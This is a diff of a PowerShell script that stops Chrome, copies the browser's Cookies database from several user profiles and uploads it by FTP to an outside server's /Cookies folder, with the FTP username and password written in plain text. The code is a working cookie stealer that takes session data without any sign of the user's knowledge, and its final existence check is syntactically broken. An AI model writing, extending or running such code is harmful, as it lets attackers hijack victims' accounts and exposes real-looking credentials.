@@ -6,9 +6,18 @@ try {
     Write-Host "Chrome was not running."
 }
 
-# Directories to work with
-$source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
-$source_directory_2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+# FTP server details
+$FTP_HOST = "us-east-1.sftpcloud.io"
+$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
+$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'
+
+# Resolve the %USERNAME% environment variable correctly in PowerShell
+$userName = $env:USERNAME
+
+# Directories to work with, correctly replacing %USERNAME% with actual username
+$source_directory_1 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+$source_directory_2 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+$source_directory_3 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies"
 
 # FTP function to upload files, now directing files to /Cookies directory
 function Upload-ToFtp {
@@ -17,10 +26,10 @@ function Upload-ToFtp {
         [String]$file_name
     )
     # Load Assembly and create FTPWebRequest to /Cookies directory
-    $ftpUrl = "ftp://us-east-1.sftpcloud.io/Cookies/$file_name"
+    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
     Add-Type -AssemblyName System.Net
     $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
-    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("d45b8e2d698147e59f2234fd87b98082", 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p')
+    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
     $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
     $ftpRequest.UseBinary = $true
     $ftpRequest.KeepAlive = $false
@@ -37,26 +46,20 @@ function Upload-ToFtp {
     Write-Host "Uploaded $file_name to FTP in /Cookies."
 }
 
-# Ensure C:\temp exists or create it
-$temp_folder = "C:\temp"
-if (-not (Test-Path $temp_folder)) {
-    New-Item -Path $temp_folder -ItemType Directory
+# Sequentially check each directory and upload if the Cookies file is found
+$source_directories = @($source_directory_1, $source_directory_2, $source_directory_3)
+foreach ($source_directory in $source_directories) {
+    if (Test-Path $source_directory) {
+        $file_name = [System.IO.Path]::GetFileName($source_directory)
+        $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name # Use a common temp directory for consistency
+        Copy-Item -Path $source_directory -Destination $temp_path # Copy the file to a temporary location
+        Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
+        Remove-Item -Path $temp_path # Clean up the temporary file
+        break # Stop checking once the first file is found and uploaded
+    }
 }
 
-# Check if the first file exists, then copy and upload
-if (Test-Path $source_directory_1) {
-    $file_name = [System.IO.Path]::GetFileName($source_directory_1)
-    $temp_path = Join-Path -Path $temp_folder -ChildPath $file_name
-    Copy-Item -Path $source_directory_1 -Destination $temp_path # Copy the file to a temporary location
-    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
-    Remove-Item -Path $temp_path # Clean up the temporary file
-} else {
-    Write-Host "The directory or file does not exist."
-}
-
-# Check for the second directory and ignore if it doesn't exist
-if (Test-Path $source_directory_2) {
-    Write-Host "Project2 directory exists." # Placeholder for actual actions
-} else {
-    Write-Host "Project2 folder does not exist, ignoring."
+# If none of the files were found and uploaded
+if (-not (Test-Path $source_directory_1 -Or Test-Path $source_directory_2 -Or Test-Path $source_directory_3)) {
+    Write-Host "None of the directories or files exist."
 }
